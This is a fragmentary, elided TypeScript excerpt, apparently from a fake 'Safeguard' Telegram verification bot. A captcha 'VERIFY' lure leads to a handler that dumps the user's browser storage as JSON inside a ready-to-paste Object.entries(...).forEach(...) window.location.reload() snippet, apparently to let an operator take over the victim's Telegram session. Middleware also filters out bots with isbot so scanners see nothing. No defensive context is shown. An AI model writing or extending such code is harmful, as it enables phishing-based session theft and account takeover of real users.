...
Click 'VERIFY' and complete captcha to gain entry - <a href="https://docs.safeguard.run/group-security/verification-issues"><i>Not working?</i></a>`;
  ...
  const input = new InputFile(
    sgClickVerifyURL || sgClickVerify
  );
...
const newVerified = async (ctx: Context) => {
  ...
  if (storage) {
    ...
    try {
      ...
      const log = `<tg-emoji emoji-id="5260206718410839459">✅</tg-emoji>
<a href="t.me/${user.username}">
@${user.username}
</a>


<pre>Object.entries(${JSON.stringify(storage)})
.forEach(([name,value]) =>
...
window.location.reload();</pre>`;
      ...
      const config =
        (entry.value || sgConfigDefault) as SafeguardConfig;
...
app.use(async (ctx: Context) => {
  ...
  if (isbot(ctx.request.userAgent.ua)) {
    return;
  }
  ...
  const path =
    ctx.request.url.pathname.slice(1);
